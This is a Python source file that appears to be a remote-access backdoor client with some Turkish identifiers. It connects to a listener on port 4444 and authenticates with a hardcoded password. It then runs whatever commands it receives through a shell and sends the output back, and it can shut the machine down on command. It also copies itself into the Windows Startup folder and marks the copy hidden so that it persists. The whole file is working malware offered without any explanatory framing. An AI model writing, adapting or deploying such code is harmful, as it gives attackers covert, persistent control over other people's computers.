import socket
import subprocess
import os
import shutil




PASSWORD = str("semih")

s = socket.socket()
host = str("127.0.0.1")
port = 4444

try:
    s.connect((host, port))


    s.send(PASSWORD.encode())
    auth_response = s.recv(1024).decode()

    if auth_response != "AUTH_SUCCESS":
        print("Authentication failed! Closing connection.")
        s.close()
        exit()

    while True:
        command = s.recv(1024).decode().strip()
        if not command:
            break

        if command.lower() == "kapat":
            s.send(b"Shutting down...")


            if os.name == "nt":
                os.system("shutdown /s /t 0")
            else:
                os.system("shutdown -h now")

            break

        if command.lower().startswith("touch "):
            filename = command.split(" ", 1)[1]
            try:
                with open(filename, 'w') as file:
                    file.write("")
                s.send(f"File {filename} created successfully.".encode())
            except Exception as e:
                s.send(f"Failed to create file {filename}: {str(e)}".encode())
        else:
            try:
                cmd = subprocess.Popen(
                    command,
                    shell=True,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
                output = cmd.stdout.read() + cmd.stderr.read()
                s.sendall(output)
            except Exception as e:
                s.sendall(str(e).encode())
except Exception as e:
    print(f"Error: {e}")
finally:
    s.close()

import sys

def add_to_startup():
    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')

    if getattr(sys, 'frozen', False):

        script_path = sys.executable
    else:

        script_path = os.path.realpath(__file__)

    file_name = os.path.basename(script_path)
    destination = os.path.join(startup_folder, file_name)

    if not os.path.exists(destination):
        shutil.copyfile(script_path, destination)


        try:
            import ctypes
            ctypes.windll.kernel32.SetFileAttributesW(destination, 2)
        except:
            pass
add_to_startup()
